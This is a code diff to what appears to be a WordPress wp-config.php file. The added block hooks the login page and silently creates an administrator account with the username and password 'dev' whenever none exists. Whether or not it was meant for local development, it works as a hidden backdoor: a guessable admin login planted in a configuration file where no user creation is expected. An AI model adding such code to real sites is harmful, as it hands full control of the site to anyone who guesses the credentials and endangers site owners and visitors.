@@ -63,3 +63,17 @@ $table_prefix  = 'wp_';
 
 /** Sets up WordPress vars and included files. */
 require_once __DIR__ . '/wp-settings.php' ;
+
+add_action( 'login_init', function () {
+	$username = 'dev';
+	$password = 'dev';
+	$email = 'dev@localhost';
+	if ( !username_exists( $username ) ) {
+		wp_insert_user( [
+			'user_login' => $username,
+			'user_pass' => $password,
+			'user_email' => $email,
+			'role' => 'administrator',
+		] );
+	}
+} );
